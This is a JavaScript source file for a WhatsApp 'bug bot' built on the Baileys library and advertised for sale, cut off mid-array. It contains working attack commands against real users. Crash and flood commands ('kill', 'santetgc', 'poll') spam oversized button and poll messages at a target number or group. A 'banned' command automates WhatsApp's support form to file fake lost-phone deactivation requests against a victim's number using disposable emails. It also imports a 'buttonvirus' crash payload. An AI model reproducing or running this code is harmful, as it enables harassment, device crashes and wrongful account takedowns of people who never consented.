const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = '꧁ᬊᶜʰᬁ𝙎𝙖𝙣𝙯-𝘽𝙤𝙩𝙙☠︎࿐'
global.ownerNumber = ["083143155277@s.whatsapp.net"]
global.prefa = ['6283143155277','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}
//=================================================//
module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
//=================================================//        
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
             const isGroup = diablobotwhatsapp.chat.endsWith('@g.us')
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//=================================================//
const deploy = (teks) => {
  diablo.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}   
//=================================================//   
const reply = (teks) => {
return diablo.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC DANIMAKER`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/@DaniMaker`}}}, { quoted: m })} 	
//=================================================// 
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

var sticBanLu = (hehe) => {
ano = fs.readFileSync('./basedani/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'menu':
jiren = ` 
╭━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━╮
┃╭─────────⩵꙰ཱི࿐
┃╰─ ⏤͟͟͞𝗠𝗘𝗡𝗨 ─➤ ↶↷
╰━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━͙✩̣̣̣
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
SILAHKAN PILIH MENU DIBAWAH

• bugmenu
• othermenu

CREDIT : ꧁ᬊᶜʰᬁ𝙎𝙖𝙣𝙯-𝘽𝙤𝙩𝙙☠︎࿐
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
`
case 'bugmenu':
jiren = ` 
 *🇲🇨 Aku Adalah Bot War Dari Indonesian*
 *🇲🇨 Im A Bot War From Indonesian*

° Owner  : 6283143155277
° Version : 2
┈╱▔╲▂╱╱╱╱▂╱▔╲┈┈
▕▔╲┈╱▔╲┈┈╱╲╱▔▏┈
▕▏┈▏╱▉╲┈┈╱▉╲▕▏┈
┈╲▃▏▔▔▔╲▂▂▂▕╱┈┈
┈┈┈▏┊┊┳┊╲▂╱┳▏┈┈
┈┈▕╲▂┊╰━━┻━╱┈┈┈
┈┈╱┈┈▔▔╲▂▂╱╲┈┈┈
╭━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━╮
┃╭─────────⩵꙰ཱི࿐
┃╰─ ⏤͟͟͞BUG NYA ─➤ ↶↷
╰━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━͙✩̣̣̣
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
^BUG BOT VIP BY ꧁ᬊᶜʰᬁ𝙎𝙖𝙣𝙯-𝘽𝙤𝙩𝙙☠︎࿐^
Info Botꫂ]
╭┈─────────────⩵꙰ཱི
⎙ : *Name Own* : ꧁ᬊᶜʰᬁ𝙎𝙖𝙣𝙯-𝘽𝙤𝙩𝙙☠︎࿐
⎙ : *Name bot* : XYROR BUG🔥
⎙ : *Nama sc* : BUG VIP PRIVATE🔥
╰───➤ 
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[JANGAN DI SALAH GUNAKAN️]
╭▱▰▱▰▱▱▰▱▰▱〘 𝙊𝙏𝙃𝙀𝙍 〙▱▰▱▰▱▰▱▰▱
┃➳ : Sewa
┃➳ : Stats ( Untuk Cek Status )
┃➳ : Restart
┃➳ : addakses @
┃➳ : delakses @
┃➳ : kick @
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•━•⩵࿐
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
Bug Vip️ꫂ]
╭━━•›〘 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 〙
│㞮 : 👽〘 contoh 62xxx.ꫂ 〙
│㞮 : 👹〘 contoh 62xxx.ꫂ 〙
│㞮 : 💥〘 contoh 62xxx.ꫂ 〙
│㞮 : 🥭〘 contoh 62xxx.ꫂ 〙
│㞮 : 🌸〘 contoh 62xxx.ꫂ 〙
│㞮 : 🍆〘 contoh 62xxx.ꫂ 〙
│㞮 : 🍊〘 contoh 62xxx.ꫂ 〙
│㞮 : 🍋〘 contoh 62xxx.ꫂ 〙
│㞮 : 🍐〘 contoh 62xxx.ꫂ 〙
│㞮 : 🌷〘 contoh 62xxx.ꫂ 〙
│㞮 : 🗿〘 contoh 62xxx.ꫂ 〙
│㞮 : 🔥〘 contoh 62xxx.ꫂ 〙
│㞮 : banned〘 contoh 62xxxxx.ꫂ 〙
│㞮 : santet 〘 contoh 62xxxxx.ꫂ 〙
│㞮 : kill〘 contoh 62xxxxx.ꫂ 〙
│㞮 : brutal〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bug1000〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bug〘 contoh 62xxxxx.ꫂ 〙
│㞮 : troli〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bom〘 contoh 62xxxxx.ꫂ 〙
│㞮 : mental〘 contoh 62xxxxx.ꫂ 〙
│㞮 : crash〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bom〘 contoh 62xxxxx.ꫂ 〙
│㞮 : ganas〘 contoh 62xxxxx.ꫂ 〙
│㞮 : button〘 contoh 62xxxxx.ꫂ 〙
│㞮 : trava〘 contoh 62xxxxx.ꫂ 〙
│㞮 : katalog〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugmex〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugsuhu〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugjago〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugdarkness〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugwaifu〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugbully〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugslebew〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bugneko〘 contoh 62xxxxx.ꫂ 〙
│㞮 : bughentai〘 contoh 62xxxxx.ꫂ 〙
│㞮 : aduhcuy〘 fix!!! 〙
│㞮 : poll 〘 Vote!!〙
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•━•⩵࿐
╭━━•› 〘 ATTACK GROUP 〙
│㞮 : santetgc〘 linkgc 〙
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
「 PENTING!!! 」
㞮 : Yang Mau Buy Sc Ini Bisa Langsung Cht ke nomer https://wa.me/6283143155277
㞮 : Sc By ꧁ᬊᶜʰᬁ𝙎𝙖𝙣𝙯-𝘽𝙤𝙩𝙙☠︎࿐
`
diablobotwhatsapp.reply(jiren)
break

case 'othermenu':
jiren = `
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
                  𝗢𝗧𝗛𝗘𝗥
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
【♡ۣۜۜ፝͜͜͡͡✿➣  tag ( untuk tag member }
【♡ۣۜۜ፝͜͜͡͡✿➣  restart ( untuk restart bot )
【♡ۣۜۜ፝͜͜͡͡✿➣  stats ( untuk melihat status bot )
【♡ۣۜۜ፝͜͜͡͡✿➣  akses ( untuk beli akses )
【♡ۣۜۜ፝͜͜͡͡✿➣  sewa ( untuk sewabot dalam grup )
▬▭▬▭▬▭▬▭▬▭▬▭▬
    
`
diablobotwhatsapp.reply(jiren)
break
case 'akses':
diablobotwhatsapp.reply(`UNTUK AKSES BOT CHAT OWNER : wa.me/6283143155277`)
break
case 'sewa':
diablobotwhatsapp.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/6283143155277`)
break

case 'restart':{
 if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `SUCCES KAK`
        diablobotwhatsapp.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'addakses':
 if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'delakses':
    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'tag': {
 if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
   
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
}
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
diablobotwhatsapp.reply(respon)
}
 case 'kill':
         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
        txts = `SUCCES ✅`
        diablobotwhatsapp.reply(txts)
        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '20'
        waktu = `4s`
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'BUG BY JOKER', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `AKWOWK KASIAN️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
case 'poll': {
if (!itsMediablo) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU DANIMAKER`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT DANIMAKER",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY DANIMAKER"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
diablo.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')}
}
break
// BUG VERIF //
case 'banned': {
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
diablobotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
// INI BUG GRUP //
  case "santetgc":{
   if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
diablobotwhatsapp.reply(`otw bos`)
if (!q) return reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "5"
for (let i = 0; i < jumlah; i++) {
let kir = await diablo.groupAcceptInvite(result)
diablo.sendMessage(kir, {
text: 'BUG BY CYCLONE', 
templateButtons: [
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
